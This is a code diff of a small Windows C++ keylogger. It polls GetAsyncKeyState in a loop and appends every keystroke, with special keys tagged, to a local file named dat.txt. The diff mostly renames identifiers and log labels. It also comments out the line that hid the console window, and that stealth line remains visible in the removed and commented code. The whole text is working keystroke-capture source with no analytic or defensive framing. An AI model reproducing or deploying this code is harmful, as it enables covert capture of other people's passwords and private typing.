@@ -1,8 +1,5 @@
-#define _WIN32_WINNT 0x0500
 #include <Windows.h>
 #include <string>
-#include <stdlib.h>
-#include <stdio.h>
 #include <iostream>
 #include <fstream>
 
@@ -22,8 +19,8 @@ void LOG(string input) {
 }
 
 
-bool SpecialKeys(int S_Key) {
-	switch (S_Key) {
+bool parseUnprintable(int S_key) {
+	switch (S_key) {
 	case VK_SPACE:
 		cout << " ";
 		LOG(" ");
@@ -58,19 +55,19 @@ bool SpecialKeys(int S_Key) {
 		return true;
 	case VK_UP:
 		cout << "#UP";
-		LOG("#UP_ARROW_KEY");
+		LOG("#UP_ARROW_key");
 		return true;
 	case VK_DOWN:
 		cout << "#DOWN";
-		LOG("#DOWN_ARROW_KEY");
+		LOG("#DOWN_ARROW_key");
 		return true;
 	case VK_LEFT:
 		cout << "#LEFT";
-		LOG("#LEFT_ARROW_KEY");
+		LOG("#LEFT_ARROW_key");
 		return true;
 	case VK_RIGHT:
 		cout << "#RIGHT";
-		LOG("#RIGHT_ARROW_KEY");
+		LOG("#RIGHT_ARROW_key");
 		return true;
 	case VK_CONTROL:
 		cout << "#CONTROL";
@@ -89,20 +86,19 @@ bool SpecialKeys(int S_Key) {
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char KEY = 'x';
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	while (true) {
 		Sleep(10);
-		for (int KEY = 8; KEY <= 190; KEY++)
+		for (int key = 8; key <= 190; key++)
 		{
-			if (GetAsyncKeyState(KEY) == -32767) {
-				if (SpecialKeys(KEY) == false) {
+			if (GetAsyncKeyState(key) == -32767) {
+				if (parseUnprintable(key) == false) {
 
 					fstream LogFile;
 					LogFile.open("dat.txt", fstream::app);
 					if (LogFile.is_open()) {
-						LogFile << char(KEY);
+						LogFile << char(key);
 						LogFile.close();
 					}
 
@@ -113,4 +109,3 @@ int main()
 
 	return 0;
 }
-
